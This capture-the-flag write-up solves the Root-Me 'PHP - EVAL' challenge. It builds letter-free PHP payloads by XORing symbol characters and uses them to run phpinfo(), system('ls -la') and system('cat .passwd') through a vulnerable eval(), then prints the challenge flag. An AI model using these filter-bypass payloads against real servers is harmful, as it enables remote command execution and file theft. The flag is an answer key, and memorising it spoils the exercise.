Hello, In this Writeup, I will explain methods for executing non-alphabetical PHP code to bypass PHP filters in [PHP - EVAL](https://www.root-me.org/fr/Challenges/Web-Serveur/PHP-Eval) challenge.

## Challenge Source Code Analysis.
```php
<head>
</head>
<body>
 
<h4> PHP Calc </h4>
 
<form action='index.php' method='post'>
    <input type='text' id='input' name='input' />
    <input type='submit' />
<?php
 
if (isset($_POST['input'])) {
    if(!preg_match('/[a-zA-Z`]/', $_POST['input'])){
        print '<fieldset><legend>Result</legend>';
        eval('print '.$_POST['input'].";");
        print '</fieldset>';
    }
    else
        echo "<p>Dangerous code detected</p>";
}
?>
</form>
</body>
</html>

```

The PHP script first checks whether a POST parameter named `input` is present. If the input does not contain letters or backticks, it is evaluated as PHP code using eval(), with the result printed on the screen. However, if letters or backticks are detected, the script issues a warning: "Dangerous code."

## Spotting the bug.
After some research on Google, I discovered a method to bypass this filter, which is **Bypass using Non-alphabetical Character Encoding.** Let's discuss it, and we can use [onlinegdb](https://www.onlinegdb.com/) to test and run PHP code easily and quickly. In PHP, we can use the XOR operator between characters (not just numbers) to generate a different character.

## Manuel Exploiting.
So, here's the idea behind our attack: what if we could reproduce an alphabetical character by xoring two non-alphabetical characters? How can we achieve this?

The XOR operator works like this: When you XOR any two numbers, it produces a result. If you XOR this result with one of the original numbers, you'll get the third number.

For example, let's say we want to produce the character s by XORing two unknown characters.

Steps to perform the attack:
- Get the ASCII decimal value of the letter **s**, which is 115, using the ord() function in Python.

- Select a random non-alphabetical character, such as **@**, and get its ASCII decimal value, which is 64.

- XOR these two decimal values and convert the result into a character using the chr() function in Python.

- Check if the resulting character is alphabetical. The goal is to ensure the character is non-alphabetical, so it can bypass the filter.

- Finally, XOR the random non-alphabetical character with the number obtained from the XOR operation, which will give us the letter we need.

I can now try this payload in our challenge website:  `"@"^"3"`

## Automated Exploitation.
Nice, we can now automate this process using python, I write a simple python script to automate this task which 
is [php-non-alphabetical-Encoder](https://github.com/0XMohomiester/PHP-Non-Alphabetical-Encoder.git)

we can now use it to generate `phpinfo` word to execute `phpinfo()` in the server.

```python
python3 php-non-alpha-encoder.py phpinfo
("+"^"[").("("^"@").("+"^"[").(")"^"@").("."^"@").("&"^"@").("/"^"@")
```
**How can we call this payload as a function?**

In PHP, if we declare `$__` as a variable and store the generated string from the tool in it, we can call it as `$__();` to execute it as a PHP function. We can use it like this:
```php
$__ = ("+"^"[").("("^"@").("+"^"[").(")"^"@").("."^"@").("&"^"@").("/"^"@");
$__();
```

![img_screenshot3](https://github.com/0XMohomiester/0XMohomiester.github.io/assets/47929033/36cbf8b5-d666-4f00-8797-3c03e61e01c5)

we can use payload like this:  `system("ls -la")` to run system commands

```php
$_1 = (","^"@").("("^"[");
$_2 = "-"; 
$_3 = (","^"@").("!"^"@"); 
$__ = ("("^"[").("$"^"]").("("^"[").(")"^"]").("%"^"@").("-"^"@");  
$__($_1 . " " . $_2 . $_3);
```

Good, Command executed and flag inside `.passwd` file.

We can now generate payload like : `system("cat .passwd")` to get the flag.

```php
$_1 = ("#"^"@").("!"^"@").(")"^"]");
$_2 = ("+"^"[").("!"^"@").("("^"[").("("^"[").("("^"_").("$"^"@");
$__ = ("("^"[").("$"^"]").("("^"[").(")"^"]").("%"^"@").("-"^"@");
$__($_1 . " " . "." . $_2);
```
and Finally here is our flag : `M!xIng_PHP_w1th_3v4l_L0L`
